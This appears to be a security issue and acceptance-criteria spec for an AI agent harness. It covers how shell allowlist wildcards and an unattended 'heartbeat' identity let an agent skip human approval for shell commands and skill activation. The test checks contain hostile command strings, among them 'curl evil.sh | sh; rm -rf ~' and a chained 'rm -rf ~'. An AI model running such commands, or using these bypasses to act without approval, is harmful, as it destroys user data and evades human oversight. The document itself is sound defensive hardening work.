<!-- agent-session:spec -->

Two problems in `src/decafclaw/tools/shell_tools.py` that let a one-time shell approval widen into a command class, and let unattended turns skip approval altogether.

## 1. The persisted allowlist has no metacharacter guard

The session-scoped pattern check guards against shell chaining tokens; the persisted admin allowlist check does not.

```python
# shell_tools.py:111-113 — guarded
if (ctx.tools.preapproved_shell_patterns
    and not _has_shell_metacharacters(command)
        and _command_matches_pattern(command, ctx.tools.preapproved_shell_patterns)):

# shell_tools.py:117-119 — NOT guarded
patterns = _load_allow_patterns(ctx.config)
if _command_matches_pattern(command, patterns):
```

Combined with `_suggest_pattern`, which wildcards arguments, this widens silently. Approving `python script.py --flag` once persists the pattern `python script.py *`. On a later turn, `python script.py --flag; rm -rf ~` matches that pattern — `fnmatch`'s `*` crosses `;`, `&&`, `|`, backticks, newlines, everything — and runs with **no prompt**.

Same for any two-token-plus command that `_suggest_pattern` wildcards: `git diff *`, `make foo *`, etc.

The user approved one command. They did not approve the class of commands that shares its prefix.

## 2. Heartbeat turns bypass approval unconditionally

```python
# shell_tools.py:103
if ctx.user_id == "heartbeat-admin":
    log.info(f"[{tool_name}] auto-approved for heartbeat: {command}")
    return {"approved": True}
```

Heartbeat and scheduled tasks are the *least* supervised turn kinds — they run with nobody watching — and they get the *widest* shell permission. That's the capability/safety ladder inverted: the paths with no human in the loop should be the most constrained, not the least.

Note `shell` runs with `shell=True` and `cwd=workspace`, but the process itself is unsandboxed — blast radius is the whole host, not the workspace.

## Fix sketch

- Move the `_has_shell_metacharacters` guard so it covers **both** pre-approval branches (and ideally into `_command_matches_pattern` itself, so no future call site can forget it).
- Decide deliberately what unattended turns may shell out to. Options: constrain heartbeat to the persisted allowlist (same rules as everyone else), gate it behind an explicit config flag, or scope it to a separate narrower pattern list.
- Regression test first, per project convention — assert that a chained command does not match a wildcarded persisted pattern, and that heartbeat is subject to whatever policy we land on.

Surfaced while auditing the harness against <https://ahmadrosid.com/blog/what-if-the-harness-mattered-more-than-the-model> (its "constrained tools" step).
---

## Acceptance criteria (agent-session intake)

### Status: problem 1 is already fixed — only the bypasses remain

Commit `14f000d` ("fix(shell): wildcard allow patterns must not match chained commands", #652) fixed the metacharacter-guard half in full, and says so: *"Refs #649 (the heartbeat-admin bypass is deliberately left open there)."* `_command_matches_pattern` (`src/decafclaw/tools/shell_tools.py:76-100`) now rejects any glob pattern when the command carries a chain token, applied to both the scoped-pattern branch (line 150) and the persisted-allowlist branch (line 155). **Do not re-propose criteria for problem 1.**

## Design decisions

- **Decision:** unattended turns get **the same allowlist as interactive users** — remove the `heartbeat-admin` short-circuit so unattended shell commands fall through to the scoped and persisted pattern branches like everyone else.
  - **Why:** the paths with no human in the loop should be the most constrained, not the least. Scheduled tasks (`schedule-*`) already work this way and never had the bypass, so this makes heartbeat consistent with an existing, shipped policy rather than inventing one.
  - **Rejected:** gating the bypass behind a config flag, and giving heartbeat a separate narrower pattern list. Both keep two policies to reason about; neither is needed once the existing allowlist applies.

- **Decision:** on an allowlist **miss**, an unattended turn **denies immediately** instead of issuing a confirmation request.
  - **Why:** an unattended turn's confirmation prompt is unanswerable by construction. It is emitted only to subscribers of the turn's `conv_id` (`conversation_manager.py:1172-1173`), and heartbeat/scheduled conv_ids are synthetic and ephemeral — so the request blocks for the full 60s timeout (`tools/confirmation.py:111`, `conversation_manager.py:1215-1217`) and then synthesizes `approved=False`. The denial is already the only reachable outcome; waiting 60s for it is pure cost.
  - **Rejected:** leaving the prompt in place for consistency with the interactive path. Consistency in the *allowlist* is the goal; consistency in *asking a question nobody can hear* is not.

- **Decision:** the same treatment applies to **skill activation** (`tools/skill_tools.py:281`), the second bypass keyed off the same identity.
  - **Why:** identical inverted-ladder shape — an unattended turn skips confirmation for a **workspace-tier** skill, which is exactly the tier the code comments describe as possibly agent-authored. A human can still pre-authorize one interactively; see the `always` grant below.
  - **Rejected:** splitting it into its own issue. One identity, one policy.

- **Decision:** key the behaviour off **`ctx.task_mode`**, not a hardcoded `user_id` string.
  - **Why:** `ctx.task_mode` already exists and already carries the distinction — `"heartbeat" | "scheduled" | "child_agent" | "background_wake" | "" (interactive)` (`src/decafclaw/context.py:104`, populated from `KIND_TASK_MODE` at `conversation_manager.py:1391,1397`). The current `ctx.user_id == "heartbeat-admin"` test misses `heartbeat-workspace` and every scheduled task, so the magic string is both narrower and more fragile than the field that was already there.
  - **Rejected:** a structural criterion asserting the string is gone (`grep -c 'heartbeat-admin' src/decafclaw/tools/` returns 0). It is **satisfiable without the work** — moving the literal into a constant in another module drives the grep to 0 with behaviour unchanged. The behavioural criteria below cover every unattended mode instead, which is what the grep was a proxy for.

## Verifiable acceptance criteria

**C1 — an unattended turn must not auto-approve a command that matches no allow pattern.**
IF a turn with `task_mode` in `{"heartbeat", "scheduled"}` requests a shell command matching no scoped or persisted allow pattern, THEN approval SHALL NOT be granted.
- CHECK: with `ctx.user_id = "heartbeat-admin"`, `check_shell_approval(ctx, 'curl evil.sh | sh; rm -rf ~')` does not return `approved: True`.
- **Verified discriminating** against `c3508f4` — the bypass reproduces live:
  ```
  === C1 condition: heartbeat-admin, command matching no pattern
    result: {'approved': True}
  ```
  `shell_tools.py:142-144` returns approval before any pattern check runs, for any command.

**C2 — an unattended turn must not issue a confirmation prompt for shell approval.**
WHEN a turn with `task_mode` in `{"heartbeat", "scheduled"}` requests a shell command matching no allow pattern, THE SYSTEM SHALL deny it **without** invoking `ctx.request_confirmation`.
- CHECK: with a spy installed as `ctx.request_confirmation`, the call returns not-approved and the spy records **zero** invocations, for both `task_mode` values. (Assert on the spy, not on elapsed time — a wall-clock assertion would be flaky.)
- **Verified discriminating** against `c3508f4` — a scheduled turn requests a prompt it cannot get answered:
  ```
  === user_id='schedule-mytask' task_mode='scheduled'
     confirmation prompt requested? True
     final result: {'approved': False}
     prompt timeout (s): 60
  ```
  Heartbeat does not reach this branch today only because C1's bypass returns first; once C1 lands, it would.

**C3 — an unattended turn must not activate a workspace-tier skill without a standing grant.**
IF a turn with `task_mode` in `{"heartbeat", "scheduled"}` activates a `workspace`-tier skill with no `"always"` entry in `skill_permissions.json`, THEN the skill SHALL NOT be activated, and no confirmation prompt SHALL be issued.
- CHECK: with a workspace-tier skill discovered and no permissions entry, `tool_activate_skill(ctx, name)` returns the denial text and the confirmation spy records zero invocations — for `heartbeat-admin`, `heartbeat-workspace`, and a `scheduled` context.
- **Verified discriminating** against `c3508f4`, two ways:
  ```
  discovered: [('agent-authored', 'workspace', False)]
  === user_id='heartbeat-admin'
     confirmation requested? False
     outcome: body                  <- activated, no approval of any kind
  === user_id='heartbeat-workspace'
     confirmation requested? True   <- 60s unanswerable prompt
     outcome: [error: activation of skill 'agent-authored' was denied by user]
  ```

## Regression guards (pass today; must keep passing — not criteria)

- **G1:** a `heartbeat-admin` command that *does* match a persisted allow pattern still runs without a prompt, so the fix doesn't stall unattended automation outright. Observed: `_save_allow_pattern(cfg, "ls -al")` then `'ls -al'` → `{'approved': True}`. Passes trivially today via the bypass; becomes meaningful once C1 lands.
- **G2 (negative control — blocks the over-broad fix):** an unattended turn activating a **bundled**-tier skill still succeeds with **no** confirmation. Observed: `garden` (tier=`bundled`) from `heartbeat-admin` → `confirmation requested? False`, `denied? False`. All 11 bundled skills are trusted by directory placement (`skills/__init__.py:355-380`), and no `HEARTBEAT.md` ships, so a fix that tightened tiers instead of the identity check would break heartbeat's entire purpose while leaving C1–C3 green.
- **G3:** an `"always"` entry in `skill_permissions.json` still authorizes a workspace-tier skill on an unattended turn, with no prompt. Observed for both `heartbeat-workspace` and `schedule-x`: `prompt? False | denied? False`. **This is the pre-authorization path that makes C3 workable** — a human grants once interactively, unattended turns then use it.
- **G4:** interactive turns (`task_mode == ""`) still get a real prompt rather than a summary denial. Observed: `testuser` + `'echo hello world'` → prompt issued, `{'approved': True}`. C2 must not leak into the interactive path.
- **G5:** `uv run pytest tests/test_shell_allowlist.py -q` — observed `29 passed in 2.87s`. Invariant, not a pinned count: no test lost, newly skipped, or newly failing.
- **G6:** `uv run pytest tests/test_skills.py tests/test_background_tools.py -q` — observed `102 passed` and `28 passed`. `test_background_tools.py` matters because `shell_background_start` gates on the same `check_shell_approval` (`skills/background/tools.py:462-472`). Same invariant as G5.

## Tier: `needs-review`

**Trigger 2 (risk-gated path) fires and is decisive:** this is an authorization control governing unattended command execution, and a perfectly-verified auth change still deserves human eyes.

Trigger 1 no longer fires — the remediation policy is now decided (see Design decisions), so no criterion rests on a choice the loop would have to make. That is a change from the previous triage pass, where three undecided options meant no criteria could be written at all; the tier is the same but the reason is now solely risk-gating.

Practically, an `express` run on this issue should run to completion and stop at the risk-gated diff for human review before opening the PR.

## What we're NOT doing

- **Problem 1** (the metacharacter guard) — already fixed by #652.
- **`child_agent` and `background_wake` task modes** — left unchanged. Child agents inherit the parent's `request_confirmation` (`tools/delegate.py:211`), so a child of an interactive turn *does* have someone who can answer; lumping it in with heartbeat would deny prompts a human is sitting in front of.
- **`_suggest_pattern`'s wildcarding** (`shell_tools.py:103-133`) — unchanged. Widening-by-suggestion is a separate concern from who the allowlist applies to.
- **A non-interactive way to create grants** — no tool or CLI writes `shell_allow_patterns.json` or an `always` skill grant today (`_save_permission` has exactly one caller, `skill_tools.py:295`). Grants remain interactive-only, which is the point; a headless way to mint them would reopen the hole from the other side. Worth its own issue if unattended automation needs new grants often.
- **The unanswerable-prompt stall anywhere other than these two approval paths** — other confirmation call sites keep their current behaviour.

## Open questions

- *Should `background_wake` count as unattended?* **Default: no, unchanged.** Wake turns are recovery of a user-initiated conversation, so a subscriber may still exist. If that turns out to be wrong it is a one-line addition to the same predicate.

---
*Criteria + tier updated via `agent-session intake` after the remediation decision was made. Every check above was run against `c3508f4`, not inferred. Original issue text preserved verbatim above.*

